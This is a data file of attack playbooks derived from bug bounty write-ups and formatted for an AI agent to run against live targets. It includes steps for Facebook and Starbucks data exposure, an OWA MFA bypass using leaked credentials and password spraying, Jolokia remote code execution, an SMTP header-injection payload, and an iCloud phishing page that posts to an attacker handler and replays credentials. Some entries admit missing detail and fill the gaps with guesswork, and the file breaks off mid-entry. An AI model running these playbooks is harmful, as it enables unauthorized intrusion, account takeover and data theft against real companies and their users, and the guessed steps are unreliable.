description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: How did i find information Disclosure on Facebook-Writeup

trigger_conditions.when_to_apply: When a user initiates the 'forgot password' flow and selects the option to recover the account using trusted friends, and the 'ntplr' parameter is present in the recovery URL.
prerequisites: Attacker has an authenticated Facebook account.
applicability_signals: The 'recover/trusted' endpoint is reached during a password recovery flow.
The URL contains the parameter 'ntplr'.
skip_if: The 'ntplr' parameter is not present in the URL.
The 'recover/trusted' endpoint does not disclose trusted friends information.

recon_steps: Initiate the 'forgot password' flow for a target Facebook account.
Select the 'I have no access to my email' option.
Observe the URL for the 'recover/trusted' endpoint and the presence of the 'ntplr' parameter.
attack_steps: Step 1: Navigate to the 'forgot password' flow for a target user.
Step 2: Click on 'I have no access to my email'.
Step 3: In the subsequent recovery page, locate the URL. It will be similar to: https://www.facebook.com/recover/trusted?cp=5bafbd0f%40mozej.com&ntplr=0
Step 4: Modify the value of the 'ntplr' parameter from '0' to '1' in the URL.
Step 5: Submit the modified URL (e.g., by pasting it into the browser's address bar and pressing Enter).
Step 6: Observe the response for disclosure of trusted friends' information.
tools_recommended: Burp Suite (to intercept and modify requests)
Python script (to automate the process for multiple users)
success_indicators: The response page displays a list of the target user's trusted friends.
The response page displays the top 5 friends the user talks to on Messenger, even if 'trusted friends' feature is not explicitly used by the target.
failure_indicators: The response page indicates an error or does not show any friend information.
A 400 or other error status code is returned.

playbooks.impact: Disclosure of trusted friends information for any Facebook user, which could be used for social engineering, account enumeration, or other malicious purposes.
playbooks.key_lesson: Always test numeric GET parameters in sensitive flows like password recovery by attempting to manipulate their values (e.g., from 0 to 1) to uncover information disclosure vulnerabilities.

meta.title: Hacking Starbucks and Accessing Nearly 100 Million Customer Records

tech_stack_fingerprints: app.starbucks.com responds with 200 OK for authenticated requests

trigger_conditions.when_to_apply: When an authenticated user encounters an API endpoint under '/bff/proxy/' that accepts a user-controlled value as part of its path and forwards requests to an internal system.
prerequisites: Attacker must have an authenticated session with Starbucks.
applicability_signals: API endpoint under /bff/proxy/ that takes arbitrary input in the path (e.g., /bff/proxy/stream/v1/me/streamItems/:streamItemId)
Responses from /bff/proxy/ endpoints appear to originate from an internal host.
skip_if: API endpoints do not accept user-controlled input in the path.
All requests to /bff/proxy/ result in 404 pages indicating the path is not being forwarded.
The application sanitizes or rejects path traversal characters.

recon_steps: Step 1: Browse the Starbucks website as an authenticated user and observe all outgoing API requests using browser developer tools or a proxy like Burp Suite.
Step 2: Identify API endpoints prefixed with '/bff/proxy/' that return data and appear to be proxying requests to internal systems.
Step 3: Look for endpoints under '/bff/proxy/' where a path segment can be controlled by the user, such as /bff/proxy/stream/v1/me/streamItems/:streamItemId.
attack_steps: Step 1: Send a GET request to the identified endpoint with a path traversal sequence, such as '../', appended to the user-controlled segment. Example: GET /bff/proxy/stream/v1/users/me/streamItems/../ HTTP/1.1 Host: app.starbucks.com

Step 2: Analyze the response. If a 'Not Found' error is returned within a JSON structure that is consistent with other /bff/proxy/ API responses, it indicates successful traversal to the internal system.
Step 3: Attempt to enumerate and access other internal endpoints by continuing to append path traversal sequences and known or guessed internal paths.
tools_recommended: Burp Suite: Use the Intruder or Repeater modules to craft and send traversal requests.
Browser Developer Tools: To observe network traffic and identify vulnerable endpoints.
success_indicators: Receiving a 'Not Found' JSON error response from the API when attempting to traverse paths, indicating the request reached the internal system.
Successful retrieval of sensitive information or access to unintended internal resources.
failure_indicators: Receiving a generic 404 page (not a JSON error) from the main Starbucks site, indicating the traversal attempt was not successfully proxied.
Receiving an unexpected error code (e.g., 403 Forbidden) without reaching the internal system.
The application rejects the request with invalid characters or malformed URL errors.

playbooks.impact: Access to potentially sensitive customer data including user profiles and other internal application data by traversing path segments on the internal Starbucks infrastructure.
playbooks.key_lesson: When encountering 'Backend for Frontend' (BFF) proxy endpoints, specifically test user-controlled path segments for path traversal vulnerabilities to access internal resources.

meta.title: From Recon to Bypassing MFA Implementation in OWA by Using EWS Misconfiguration

target_profile.technology: Microsoft Outlook Web Access (OWA) / Exchange Web Services (EWS)
tech_stack_fingerprints: ADFS endpoint for domain account login

trigger_conditions.when_to_apply: When a web application allows login via both domain accounts (potentially with MFA) and specific application user accounts, and the domain login redirects to an ADFS endpoint.
prerequisites: Ability to perform subdomain enumeration for the target domain.
Access to tools for credential searching (e.g., GitHub recon, sensitive data exposure).
Knowledge of EWS endpoint patterns or ability to find them.
A valid domain account that is unenrolled from MFA or can be bypassed.
applicability_signals: Target's login flow redirects to an ADFS endpoint for domain credentials.
Existence of email-related subdomains (e.g., mail, outlook, exch).
Found service account credentials (username/password) in public repositories.
ADFS login fails for a discovered domain account due to MFA enrollment.
skip_if: No ADFS endpoint identified for domain login.
All discovered subdomains are blocked by WAF or return generic error pages.
No service account credentials found through recon.

recon_steps: Step 1: Perform subdomain enumeration on the target domain (both .com and other TLDs like .net). Look for common email-related subdomains (mail, outlook, owa, exch, ews).
Step 2: Search public code repositories (e.g., GitHub) for leaked service account credentials (username and password) associated with the target domain.
Step 3: Attempt to log in to the target application using a discovered domain account via the ADFS endpoint. If MFA is enforced, note the failure but proceed.
Step 4: Identify the Exchange Web Services (EWS) endpoint. This might be a subdomain or a path under the main OWA application.
attack_steps: Step 1: With a discovered domain account and password, navigate to the OWA login page.
Step 2: Use the discovered credentials on the ADFS login prompt. Since the account is unenrolled from MFA, the EWS endpoint (which might not enforce MFA for initial access) should be accessible.
Step 3: If the EWS endpoint is found and accessible, use tools like MailSniper to interact with it.
Step 4: Execute MailSniper against the EWS endpoint to read emails from the inbox.
Step 5: (Optional) Attempt to dump the Global Address List (GAL) using MailSniper.
Step 6: (Optional) Use MailSniper to perform password spraying against other service accounts using the discovered password.
payloads_or_patterns: Tools: MailSniper configured with EWS endpoint: <EWS_ENDPOINT_URL>
tools_recommended: Subfinder/Amass for subdomain enumeration
GitHub search or specialized tools for credential discovery
MailSniper (for EWS interaction, GAL dumping, password spraying)
Burp Suite (for manual inspection and request crafting)
success_indicators: Successful login to EWS endpoint without MFA prompt using the discovered domain credentials.
MailSniper successfully reads emails from the target's inbox.
MailSniper successfully dumps the Global Address List.
Successful password spraying against other service accounts.
failure_indicators: 401/403 errors when accessing EWS endpoint with valid credentials: EWS might be misconfigured or protected differently. Pivot to other attack vectors.
No subdomains found or all subdomains are non-responsive: Indicates potential limitations in recon or target configuration. Try different recon methods.
No valid service account credentials found: The core of the exploit is missing. Focus on other vulnerabilities.

playbooks.impact: An unauthenticated attacker can bypass MFA protection on OWA by leveraging EWS misconfigurations. This allows access to sensitive email content, potential dumping of the Global Address List (containing user information), and enables further attacks like password spraying against other service accounts within the organization.
playbooks.key_lesson: When OWA login redirects to ADFS, always investigate EWS endpoints for misconfigurations that might bypass MFA, especially if valid domain credentials can be discovered through recon.

meta.title: Replying on LiveStream leading to Page Admin Disclosure

trigger_conditions.when_to_apply: When a user is interacting with a Facebook LiveStream and makes a comment.
prerequisites: An authenticated Facebook account.
Ability to start or join a LiveStream.
applicability_signals: User is viewing or broadcasting a LiveStream.
User is able to comment on the LiveStream.
skip_if: The commenting feature is disabled for LiveStreams.
All comments are correctly attributed to the user's profile and not the page.

recon_steps: Step 1: Navigate to Facebook and observe the LiveStream feature, noting any interaction points for comments.
Step 2: Initiate a LiveStream (or join one if possible) and observe the commenting interface and how replies are handled.
attack_steps: Step 1: Start a Facebook LiveStream from a test page.
Step 2: Make a comment on the LiveStream.
Step 3: Observe the reply to the comment and check if it is attributed to the personal profile instead of the page.
tools_recommended: Facebook mobile app (tested on iPad)
Web browser for observation
success_indicators: A comment made on the LiveStream is posted from the user's personal profile, rather than the page that initiated the LiveStream.
When replying to a comment on a LiveStream, the reply appears under the user's personal profile and not the page they are acting as.
failure_indicators: All comments and replies are correctly attributed to the page. → The bug might have been patched or is not present in the current version/platform.

playbooks.impact: Disclosure of Page Admin identity to unauthorized parties, potentially revealing personal information linked to a page.
playbooks.key_lesson: When interacting as a page, always verify that actions (like commenting or replying) are correctly attributed to the page and not the user's personal profile, especially in dynamic features like LiveStreams.

meta.title: Bug bounty bout report 0x01 - WebRTC edition

trigger_conditions.when_to_apply: When a target uses WebRTC and has a TURN server deployed, especially if it is exposed and not properly configured for peer access control.
prerequisites: Target infrastructure includes a TURN server.
TURN server is accessible from the internet.
applicability_signals: Presence of WebRTC functionality in the application.
Observation of TURN server traffic or known TURN server IP addresses/ports.
skip_if: TURN server is not exposed or is behind strict network controls.
TURN server has robust peer access control implemented.

recon_steps: Step 1: Identify WebRTC usage in the target application through network traffic analysis or client-side code inspection.

Step 2: Fingerprint for the presence and configuration of TURN servers. This may involve network scanning for UDP/TCP ports commonly used by TURN (e.g., 3478, 5349) or observing STUN/TURN requests/responses in network traffic.
attack_steps: Step 1: Attempt to establish a WebRTC connection through the identified TURN server. This typically involves using a WebRTC client or framework.
Step 2: Configure the TURN client to relay traffic between two arbitrary peers (controlled by the attacker) through the target TURN server.
Step 3: Observe if the TURN server allows relaying traffic between these peers without proper authentication or authorization checks, indicating an open relay vulnerability.
payloads_or_patterns: Use of WebRTC libraries (e.g., native WebRTC in browsers, libraries like mediasoup, pion/webrtc) to initiate peer connections and configure TURN server details.
Configuration of TURN server credentials (if any) to be weak or absent during initial connection attempts.
tools_recommended: WebRTC client libraries (e.g., `pion/webrtc` in Go, ` mediasoup` in Node.js, native browser WebRTC API)
Network scanning tools (e.g., `nmap`) to identify TURN server ports.
Packet analysis tools (e.g., `Wireshark`) to inspect STUN/TURN traffic.
success_indicators: Successful relay of arbitrary UDP or TCP traffic between attacker-controlled peers through the target TURN server.
The TURN server does not enforce peer-to-peer access control, allowing unauthorized relaying.
failure_indicators: TURN server refuses connection or blocks relay attempts due to authentication or authorization failures (e.g., 401 Unauthorized, 438 Forbidden). Pivot to investigating other WebRTC components or configurations.
No TURN server is found or accessible.

playbooks.impact: An attacker can abuse the TURN relay to perform various malicious activities, including but not limited to: initiating DDoS attacks, scanning internal networks (if TURN server has access), proxying malicious traffic, or eavesdropping on media streams if not properly encrypted.
playbooks.key_lesson: Ensure TURN servers are configured with robust peer access control mechanisms and are not exposed to the internet without proper authentication and authorization to prevent open relay abuse.

meta.title: How I made more than $30K with Jolokia CVEs

tech_stack_fingerprints: Jolokia agent detected via characteristic response or error messages

trigger_conditions.when_to_apply: When a target exposes the Jolokia agent without proper authentication or authorization, allowing unauthenticated access to MBean operations.
prerequisites: Jolokia agent must be deployed and accessible on the target.
applicability_signals: Accessing a Jolokia endpoint (e.g., /jolokia) returns a 200 OK status code with JSON response indicating the agent is active.
Error responses might mention 'No Access-Control-Allow-Origin header' or similar CORS-related issues if not configured properly.
skip_if: Jolokia endpoint returns 401 Unauthorized or 403 Forbidden without any valid authentication.
WAF blocks requests to the Jolokia endpoint.

recon_steps: Step 1: Scan for common Jolokia agent endpoints (e.g., /jolokia, /jolokia/, /jolokia/list) and observe HTTP status codes and response bodies.
Step 2: If a 200 OK response is received, analyze the JSON response for accessible MBeans and operations.
attack_steps: Step 1: Craft a POST request to the Jolokia endpoint (e.g., /jolokia) with a JSON body specifying the target MBean operation, attribute, and type.
Step 2: For RCE, target MBeans that allow arbitrary command execution (e.g., `java.lang:type=Runtime` MBean with `exec` operation).
Step 3: Execute the crafted payload to achieve remote code execution.
tools_recommended: curl: For manual crafting and sending of Jolokia requests.
Burp Suite: To intercept, modify, and repeat Jolokia requests.
Dedicated Jolokia exploitation scripts (if available).
success_indicators: Response contains output from executed commands (e.g., 'uid=0(root) gid=0(root) groups=0(root)').
Callback received on the attacker's server (e.g., Burp Collaborator or a custom listener) showing hostname or other system information.
failure_indicators: Jolokia response indicates 'No access' or specific MBean/operation is inaccessible.
Target system does not execute commands or send callbacks.

playbooks.impact: Remote Code Execution with root privileges, allowing full compromise of the target server.
playbooks.key_lesson: Always scan for and analyze Jolokia agent endpoints for unauthenticated access to MBeans, as they can lead to RCE.

meta.title: All *.intercom.help subdomains vulnerable to Subdomain Takeover from intercom Service

trigger_conditions.when_to_apply: When a subdomain associated with *.intercom.help is found to be misconfigured and pointing to an Intercom-managed service without proper DNS records.
prerequisites: Discovery of a *.intercom.help subdomain.
applicability_signals: A *.intercom.help subdomain is found in DNS records or linked from intercom content.
The subdomain's DNS records are not correctly configured for an active service, indicating potential for takeover.
skip_if: All *.intercom.help subdomains are properly configured and resolving to active, non-takeover-vulnerable services.

recon_steps: Step 1: Enumerate subdomains for *.intercom.help using tools like Sublist3r, Amass, or crt.sh.
Step 2: For each discovered subdomain, perform DNS lookups (e.g., using dig or nslookup) to check for CNAME, A, or MX records.
Step 3: Analyze DNS records for misconfigurations that indicate the subdomain might be managed by a third-party service (like Intercom) but isn't actively in use or properly claimed.
attack_steps: Step 1: Identify a *.intercom.help subdomain with potentially misconfigured DNS records.
Step 2: Attempt to claim the subdomain on the relevant third-party service (e.g., Intercom's platform if applicable) by following their specific subdomain claiming process.
Step 3: If the service allows the claim without prior ownership verification (due to misconfiguration), the takeover is successful.
payloads_or_patterns: N/A (This is a configuration-based attack, not payload-driven)
tools_recommended: Sublist3r: For subdomain enumeration.
Amass: For advanced subdomain enumeration.
crt.sh: For certificate transparency logs to find subdomains.
dig/nslookup: For DNS record analysis.
success_indicators: The attacker gains control of the subdomain (e.g., can serve custom content, redirect traffic, or receive emails for that subdomain).
DNS records are updated to point to the attacker-controlled infrastructure.
Verification of control through a PoC hosted on the taken-over subdomain.
failure_indicators: The subdomain's DNS records are correctly configured and point to active, legitimate services.
The third-party service requires verification of ownership that the attacker cannot provide.
The service provider has implemented checks to prevent takeover of their managed subdomains.

playbooks.impact: An attacker can take control of any *.intercom.help subdomain. This could lead to phishing attacks, hosting malicious content, intercepting emails sent to the subdomain, or impersonating the legitimate service.
playbooks.key_lesson: Always verify the DNS configuration of all subdomains, especially those pointing to or managed by third-party services. Misconfigurations can lead to subdomain takeover vulnerabilities.

meta.title: SMTP Injection in Gsuite

affected_components: Gmail settings -> Advanced settings -> Routing -> Custom header/subject

trigger_conditions.when_to_apply: When an administrator configures routing rules in G Suite's Gmail settings, specifically when customizing email headers or subjects.
prerequisites: Attacker must have administrative access to a G Suite account.
applicability_signals: Presence of the 'Apps -> G Suite -> Settings for Gmail -> Advanced settings -> Routing' section in the G Suite admin console.
Option to 'add a routing setting' for inbound/outbound traffic.
Availability of 'custom header' or 'custom subject' options within routing settings.
skip_if: The G Suite admin console is unavailable or does not present the described routing and header customization options.

recon_steps: Step 1: Log in to the G Suite admin console (admin.google.com).
Step 2: Navigate to Apps -> G Suite -> Settings for Gmail -> Advanced settings -> Routing.
Step 3: Observe the options available for 'add a routing setting', specifically looking for 'custom header' and 'custom subject' fields.
attack_steps: Step 1: Create a new routing setting.
Step 2: Configure the routing to affect the desired email traffic (e.g., all outbound emails).

Step 3: In the 'custom subject' field, input a payload designed to inject newlines and subsequent headers, such as `
Subject: <INJECTED_SUBJECT>
From: <SPOOFED_FROM_ADDRESS>`.
Step 4: Save the routing setting.
Step 5: Send a test email from an account within the G Suite organization to an external recipient.
Step 6: Examine the received email headers on the external recipient's end to confirm the injection.
tools_recommended: Burp Suite (or similar proxy) to observe and potentially modify requests when saving routing settings.
Gmail (or any email client) to verify the received email headers.
success_indicators: The received email on the external recipient's end displays a subject that has been modified by the injected payload.
Additional headers, such as 'From:', are present in the email headers as a result of the injection, indicating successful SMTP header manipulation.
failure_indicators: The 'custom subject' field rejects the newline characters ('\r\n') or processes them literally without splitting the header.
The injected headers do not appear in the recipient's email.
The test email is blocked or flagged as spam due to malformed headers without clear injection confirmation.

playbooks.impact: An attacker with G Suite administrative privileges can spoof email messages originating from Google's servers by injecting arbitrary SMTP headers. This allows for highly convincing phishing attacks, business email compromise (BEC), and dissemination of misinformation, as the emails appear to come from a trusted domain (google.com).
playbooks.key_lesson: Always sanitize user-supplied input for custom headers and subjects in email configuration settings, as SMTP is sensitive to newline characters which can lead to header injection and email spoofing.

meta.title: Another "Fappening" on the Horizon?

tech_stack_fingerprints: HTML source code for iCloud login page

trigger_conditions.when_to_apply: When the target service, like iCloud, mandates multi-factor authentication but does not support FIDO U2F security keys, allowing for the creation of an evil twin login page.
prerequisites: User must have an iCloud account with MFA enabled.
Attacker must be able to host a web server.
applicability_signals: iCloud login page is observed to use form-based authentication.
No explicit mention or implementation of FIDO U2F support is found.
skip_if: Target service implements FIDO U2F, rendering the evil twin page ineffective for capturing credentials that bypass MFA.

recon_steps: Step 1: Access the official iCloud login page and observe its structure and form submission behavior.
Step 2: Inspect the HTML source code of the login page to identify form fields and the action attribute.
Step 3: Verify that the login page does not prompt for or support hardware security keys (FIDO U2F).
attack_steps: Step 1: Copy the entire HTML source code of the legitimate iCloud login page.
Step 2: Host the copied HTML on a controlled Apache web server.
Step 3: Modify the 'action' attribute of the login form in the hosted HTML to point to an attacker-controlled handler (e.g., a Python Flask application).
Step 4: Configure the handler to receive the POST request data (username and password) from the fake login page.
Step 5: Use a tool like Selenium to automatically submit the captured credentials to the legitimate iCloud login page in real-time.
Step 6: If the login is successful, capture the session cookies or tokens.
Step 7: For persistence, leverage the iCloud 'trust this browser' feature post-authentication, which does not require re-entry of the second factor.
payloads_or_patterns: HTML source code of the iCloud login page with modified form action attribute: <form action="<ATTACKER_HANDLER_URL>" method="post"> ... </form>
tools_recommended: Apache web server: For hosting the fake login page.
Python Flask: For creating the handler to receive credentials and replay them.
Selenium: For automated browser interaction to replay credentials and hijack sessions.
success_indicators: Successful real-time replay of captured credentials to the legitimate iCloud site, resulting in an authenticated session for the attacker.
Ability to access user account details or perform actions on behalf of the victim.
Subsequent logins to the compromised account using only username and password, without needing the second factor, indicating successful persistence via the 'trust this browser' feature.
failure_indicators: Legitimate iCloud site returns an error or invalid credentials message after replay attempt (suggests rate limiting or immediate detection of replay).
MFA prompt appears on the legitimate site even after replaying captured credentials (suggests MFA is enforced more strictly than anticipated).
Failure to establish a persistent session via the 'trust this browser' feature (suggests this feature is not exploitable or has been patched).

playbooks.impact: Full account takeover of Apple iCloud accounts, leading to unauthorized access to personal data, photos, emails, and potentially other linked Apple services. Enables the attacker to impersonate the victim and gain access to sensitive information.
playbooks.key_lesson: When MFA is present but lacks FIDO U2F support, attackers can still achieve account takeover by hosting an evil twin login page and performing real-time credential replay coupled with exploiting post-authentication session trust mechanisms.

meta.title: Privilege escalation in Partners Portal to Admin access

tech_stack_fingerprints: Partners Portal specific URLs or headers (insufficient detail in writeup)

trigger_conditions.when_to_apply: When an authenticated user in the Partners Portal can discover functionality to confirm invitation status and resend invitations, indicating potential for manipulating user management.
prerequisites: Attacker must have an authenticated account in the Facebook Partners Portal.
applicability_signals: Existence of an endpoint or feature that allows checking invitation status for a given email.
Existence of an endpoint or feature that allows resending invitations.
skip_if: No functionality to check or resend invitations is present.
All operations are properly rate-limited and protected against unauthorized access.

recon_steps: Step 1: Log in to the Facebook Partners Portal with an existing account.
Step 2: Explore the portal's features to identify user management or invitation-related functionalities.
Step 3: Look for endpoints or UI elements that allow checking the status of an invitation sent to a specific email address.
Step 4: Identify functionality that allows resending an invitation to a specific email address.
attack_steps: Step 1: Use a low-privilege account to send an invitation to a target email address (e.g., your own secondary email).
Step 2: Use the same low-privilege account to attempt to resend the invitation to the same target email address.

Step 3: Observe the response or any changes in the target email's status. If resending is possible without revoking the original, this indicates a potential to spam invitations or manipulate invitation workflows.

Step 4: If the writeup implies direct privilege escalation, investigate how the resend/confirmation functionality relates to user roles or admin privileges within the portal. (Insufficient detail in writeup for direct admin access).
tools_recommended: Burp Suite: Intercept and modify requests related to invitation confirmation and resending.
Custom script: Automate testing various email addresses.
success_indicators: Receiving multiple invitations for the same email address when only one was intended.
Successfully confirming an invitation that was not explicitly accepted by the recipient.
Ability to gain administrative privileges by manipulating the invitation flow. (This specific outcome is not detailed in the writeup, only implied by the title.)
failure_indicators: 403 Forbidden or similar error when attempting to resend an invitation that has already been sent.
No observable change or confirmation after resending the invitation.
Rate limiting preventing repeated resend attempts. (Suggests potential for brute-forcing if not implemented correctly).

playbooks.impact: The writeup title suggests privilege escalation to admin access. The detailed findings mention confirming invitations and resending them. If this functionality can be abused to grant admin roles or bypass security checks for inviting new users, it could lead to unauthorized access and control within the Partners Portal.
playbooks.key_lesson: When functionality exists to confirm or resend invitations, scrutinize the underlying logic for potential race conditions, authorization bypasses, or unintended privilege grants, especially in systems managing user roles and access.

meta.title: Disclose internal files related to testing of some Facebook tools

affected_components: Internal tools and systems related to testing

trigger_conditions.when_to_apply: When internal files or testing artifacts are accessible through unauthenticated endpoints or weak access controls on Facebook's infrastructure.
applicability_signals: Presence of endpoints or functionalities that may expose internal testing data or tools.
Observable patterns of information leakage from Facebook's systems.
skip_if: All access attempts to internal resource locations result in 403 Forbidden or 404 Not Found errors without any discernible pattern.
No readily identifiable endpoints related to internal tools or testing are exposed.

recon_steps: Step 1: Enumerate common paths and directories on Facebook infrastructure that might host internal tools or testing documentation. Look for patterns like '/internal/', '/test/', '/docs/', '/tools/', '/assets/', '/scripts/' etc.
Step 2: Analyze responses for unusual file types, directory listings, or responses that seem out of place for a public-facing service, indicating internal content.
attack_steps: Step 1: Attempt to access discovered internal file paths directly via GET requests.
Step 2: If a file is found, analyze its content for sensitive information, configurations, or details about Facebook's testing methodologies.
tools_recommended: Burp Suite Intruder for directory brute-forcing with common internal paths.
Custom scripts for targeted enumeration of specific file types or patterns within discovered directories.
success_indicators: Successful retrieval of files containing internal testing scripts, configurations, or documentation.
Response contains data that is clearly not intended for public consumption, such as internal IP addresses, development comments, or proprietary testing procedures.
failure_indicators: Receiving 403 Forbidden or 404 Not Found for all attempted paths. This indicates that the specific enumeration approach is not yielding results, and a different reconnaissance strategy might be needed (e.g., focusing on subdomain enumeration or identifying exposed APIs).
Responses are generic or contain only public-facing content, suggesting that the targeted areas do not expose internal information.

playbooks.impact: Disclosure of internal files related to Facebook tools could reveal sensitive information about the platform's internal workings, testing methodologies, security configurations, or even proprietary code, potentially aiding attackers in finding more vulnerabilities.
playbooks.key_lesson: Systematically enumerate and analyze directory structures and file paths for internal-facing resources that may not be adequately protected, paying close attention to anything that appears to be related to testing or development activities.

meta.title: Disclose the Instagram account linked to a Facebook user account or page

affected_components: Facebook user account / page linking to Instagram

trigger_conditions.when_to_apply: When an attacker can link their own Facebook account or page to an Instagram account, or has a Facebook account and wants to find the linked Instagram account.
prerequisites: Attacker has an authenticated Facebook account.
applicability_signals: The writeup mentions this specific disclosure as a capability.
Presence of user profile information that might contain linked social media accounts.
skip_if: Facebook explicitly prevents the discovery of linked Instagram accounts via its public APIs or user interfaces for privacy reasons.

recon_steps: Step 1: Analyze the Facebook Graph API documentation for endpoints related to user profiles and linked accounts.
Step 2: Inspect network traffic when manually linking or viewing linked accounts on Facebook to identify relevant API calls and parameters.
attack_steps: Step 1: Identify the Facebook User ID or Page ID for the target user/page.

Step 2: Attempt to use the Facebook Graph API (or other available APIs) to retrieve information about linked social media accounts associated with the target Facebook User ID/Page ID. Specifically look for endpoints that return Instagram usernames or profile URLs.

Step 3: If direct API access is limited, explore ways to trigger functionality that might reveal the Instagram link, e.g., through sharing or linking features, and observe the outbound requests or response data.
tools_recommended: Facebook Graph API Explorer
Burp Suite (for intercepting and analyzing requests/responses)
success_indicators: The API response or observed network traffic explicitly contains the Instagram username or a URL pointing to the linked Instagram profile.
failure_indicators: API requests return errors (e.g., 400, 403) or empty data for the Instagram account fields. Pivot: Try enumerating Instagram accounts using common username patterns associated with the Facebook user.

playbooks.impact: The attacker can discover the Instagram account linked to a specific Facebook user or page, potentially bypassing privacy settings and enabling further targeted attacks or social engineering.
playbooks.key_lesson: Investigate Facebook Graph API endpoints and user interface interactions for any disclosure of linked social media accounts.

meta.title: Internal directories enumeration in www

trigger_conditions.when_to_apply: When requests to internal web resources can be made and observed, potentially leading to the enumeration of internal directories.
prerequisites: The target system must have internal web resources accessible or discoverable via requests originating from the external network.
applicability_signals: Presence of internal URLs or paths that return meaningful responses rather than generic errors or timeouts.
skip_if: All requests to internal endpoints result in generic 404s, 403s, or connection timeouts, indicating no discoverable internal directory structure accessible this way.

recon_steps: Step 1: Observe network traffic for any unusual requests or responses related to internal hostnames or IP addresses originating from Facebook's infrastructure.
Step 2: Attempt to access known internal directory structures or common sensitive paths via HTTP requests to identify potential enumeration vectors.
attack_steps: Step 1: Send requests to potential internal endpoints, for example, by guessing common directory names or by observing traffic patterns.
Step 2: Analyze the responses for indicators of successfully accessed directories, such as directory listings, index pages, or error messages that reveal internal structures.
payloads_or_patterns: Attempt to access paths like: http://<internal_ip>/<directory_name>/
Common directory names to test: admin, dev, staging, api, internal, etc.
tools_recommended: Burp Suite: For intercepting and modifying requests, and for iterating through potential directory names.
success_indicators: Receiving directory listings or content from internal paths.
HTTP responses that are not generic 404s and indicate successful access to an internal resource.
Specific error messages that reveal internal file paths or directory structures.
failure_indicators: All attempted internal paths result in 404 Not Found, 403 Forbidden, or connection timeouts. This suggests that either the paths are incorrect, access is strictly controlled, or no such enumeration is possible through this method. Pivot to other information disclosure vectors.
Responses indicate the server is not running a web server at the attempted internal path.

playbooks.impact: Disclosure of internal directory structures, potentially revealing sensitive information, configurations, or unreleased features that could be leveraged for further attacks.
playbooks.key_lesson: When interacting with web applications, consider that internal resources may be accessible or partially exposed, and attempt to enumerate common internal directory structures.

meta.title: Race Conditions - Exploring the Possibilities

target_profile.technology: Web Application (general, no specific tech mentioned for Reddit in this excerpt)
affected_components: Group management (ctf.hacker101.com mentioned as an example)

trigger_conditions.when_to_apply: When a web application performs an action that involves checking for uniqueness (e.g., username, email, group membership) and then performing another operation based on that check, without proper locking mechanisms.
prerequisites: Attacker must have an authenticated session.
Target application must have a feature where a resource is checked for existence/uniqueness and then an action is performed based on that check.
applicability_signals: Endpoints that create or modify unique resources (e.g., create user, join group, redeem coupon).
Functionality that prevents duplicate entries (e.g., unique usernames/emails).
skip_if: WAF aggressively blocks rapid or unusual request patterns.
Application consistently returns errors or blocks actions when duplicate requests are sent simultaneously.

recon_steps: Step 1: Identify features that create or modify unique identifiers or resources, such as user registration, group invitations, or coupon redemption.
Step 2: Analyze the network traffic for these features to understand the parameters and endpoints involved in the uniqueness check and subsequent action.
attack_steps: Step 1: Craft a request that attempts to create or modify a resource (e.g., join a group, register a username).
Step 2: Use a tool like Turbo Intruder to send multiple identical requests for the same resource concurrently, targeting the endpoint identified in recon.
Step 3: Vary the timing and number of concurrent requests to try and trigger a race condition where the uniqueness check passes for multiple requests simultaneously.
Step 4: Observe the application's response and state changes to determine if the race condition was successful.
tools_recommended: Turbo Intruder: Essential for sending a high volume of concurrent requests with custom logic.
success_indicators: The creation or modification of a resource that should have been unique (e.g., a user with a duplicate username, a user being added to a group multiple times when they should only be added once).
Unexpected application behavior, such as being able to remove a non-existent member from a group, or a coupon being redeemed multiple times.
failure_indicators: All concurrent requests are rejected with errors indicating the resource already exists or the action is invalid. This might suggest proper locking mechanisms are in place. Pivot to looking for other race conditions in different features.

Requests time out or the application becomes unresponsive. This could indicate the server is overloaded, or the race condition is not exploitable in the tested manner. Adjust concurrency or request pacing.

playbooks.impact: Allows for bypassing uniqueness constraints, leading to issues like duplicate user accounts, unauthorized access to resources, or improper state management. In the example, it prevented a group member from being removed.
playbooks.key_lesson: When testing web applications, actively search for race conditions by sending multiple concurrent requests to endpoints that perform uniqueness checks followed by an action, especially when proper locking mechanisms might be overlooked.

meta.title: Privilege Escalation by Changing HTTP Response (Admin Access)

trigger_conditions.when_to_apply: When an authenticated user's profile response contains a JSON field indicating administrative privileges (e.g., 'is_admin': false) and a separate admin panel is accessible via a subdomain, and the admin panel performs insufficient server-side validation.
prerequisites: Authenticated access to the application.
Ability to intercept and modify HTTP responses.
applicability_signals: Presence of a field like 'is_admin' in the user profile response.
Existence of a subdomain that appears to be an admin panel.
skip_if: Admin panel requires separate, strong authentication not bypassable by modifying user profile flags.
All responses are server-side validated and cannot be tampered with via client-side manipulation.

recon_steps: Step 1: Register a standard user account and log in. Intercept the request to view/edit user profile.
Step 2: Enumerate subdomains using tools like Sublist3r to discover potential administrative interfaces (e.g., admin.redacted.com).
Step 3: Attempt to access the identified admin subdomain to observe its authentication requirements.
attack_steps: Step 1: Intercept the HTTP response from the user profile endpoint.
Step 2: Locate the JSON field indicating administrative status (e.g., "is_admin":false).
Step 3: Modify the value of this field to true (e.g., "is_admin":true).
Step 4: Forward the modified response to the client.
Step 5: Attempt to access the admin subdomain (e.g., admin.redacted.com) using the current session.
tools_recommended: Burp Suite (Proxy to intercept and modify responses)
Sublist3r (for subdomain enumeration)
success_indicators: Successful login to the admin panel without providing separate admin credentials.
Ability to perform administrative actions on the admin panel (e.g., edit/delete products, banners).
failure_indicators: Admin panel still requires separate authentication.
Response modification is reverted or ignored by the application.
403 Forbidden or other access denied errors when trying to access the admin panel.

playbooks.impact: An authenticated user can gain administrative privileges, allowing them to perform unauthorized actions such as editing or deleting content, managing users, or potentially compromising the entire application.
playbooks.key_lesson: Always validate administrative privileges on the server-side. Do not rely on client-controllable data or response fields to enforce access control.

meta.title: Abusing Microsoft Teams rate limiting for DDoS

trigger_conditions.when_to_apply: When a Microsoft Teams Incoming Webhook is configured and available, and the target service is susceptible to a high volume of GET requests.
